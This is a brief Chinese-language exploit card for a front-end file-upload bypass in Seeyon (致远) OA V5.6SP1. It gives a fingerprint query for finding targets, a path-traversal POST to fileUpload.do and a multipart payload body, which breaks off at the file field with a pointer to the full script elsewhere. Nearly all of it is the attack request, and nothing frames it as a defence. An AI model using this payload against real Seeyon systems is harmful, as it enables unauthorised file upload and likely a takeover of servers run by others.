# 致远互联-OA前台fileUpload.do存在绕过文件上传漏洞

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="协同管理软件 V5.6SP1"`
- **请求**：`POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: multipart/form-data; boundary=00content0boundary00`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="type"
--00content0boundary00
Content-Disposition: form-data; name="extensions"
png
--00content0boundary00
Content-Disposition: form-data; name="applicationCategory"
--00content0boundary00
Content-Disposition: form-data; name="destDirectory"
--00content0boundary00
Content-Disposition: form-data; name="destFilename"
--00content0boundary00
Content-Disposition: form-data; name="maxSize"
--00content0boundary00
Content-Disposition: form-data; name="isEncrypt"
false
--00content0boundary00
Content-Disposition: form-data; name="file1"; filena…（脚本共 940 字，完整版见原文）
```